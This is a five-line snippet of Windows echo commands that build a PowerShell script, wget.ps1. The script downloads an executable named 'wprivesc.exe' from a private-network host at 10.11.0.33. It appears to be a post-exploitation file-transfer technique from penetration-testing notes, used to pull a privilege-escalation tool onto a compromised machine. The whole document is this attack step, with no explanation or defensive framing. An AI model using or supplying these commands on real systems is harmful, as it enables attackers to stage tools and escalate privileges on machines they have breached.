echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.33/wprivesc.exe" >>wget.ps1
echo $file = "wprivesc.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
